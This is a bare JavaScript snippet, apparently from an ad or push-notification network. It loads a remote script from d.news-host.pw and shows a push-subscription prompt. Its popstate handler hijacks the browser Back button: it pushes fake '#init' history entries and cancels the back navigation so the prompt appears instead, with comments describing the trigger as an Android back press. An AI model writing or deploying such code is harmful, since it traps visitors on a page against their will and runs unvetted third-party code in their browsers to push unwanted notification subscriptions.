window.show_pushwru_show = function () {
    var scr = document.createElement("script");
    scr.src = "https://d.news-host.pw/subscriber.php?data_callback=get_params";
    scr.onload = function () {
        window.pushwru_init_iframe && window.pushwru_init_iframe('',
            function () {
                pushwru_show();
            });
    };
    document.head.appendChild(scr);
};
if (/* window.location.href.indexOf('cbp_') != -1 && */ window.location.href.indexOf('bb_') !== -1) {
    // back pressed on android
    if (window.performance && window.performance.navigation.type === 1) {
        // reload occurred. call show_pushwru_show immediately
        setTimeout(window.show_pushwru_show, 250);
    } else {
        // show_pushwru_show will be called on 2nd backpress
        var popup_tried = false;
        console.log('popstate bind');

        // xxx: donot touch. without calling pushState the popstate binding will not work
        history.pushState({init: true}, "unused argument", "#init");

        $(window).on('popstate', function (e) {
            // xxx: testing push notifications
            if (window.location.href.indexOf('sppp_') !== -1 && location.protocol === 'http:') {
                // redirecting to the same page but with https
                location.replace(location.href.replace('http', 'https'));
            } else {
                history.pushState({init: true}, "unused argument", "#init");
                console.log(e);
                var res = true;
                if (true /*!popup_tried*/) {
                    e.preventDefault();
                    res = false;
                }
                popup_tried = true;
                setTimeout(window.show_pushwru_show);
                return res;
            }
        });
    }
}
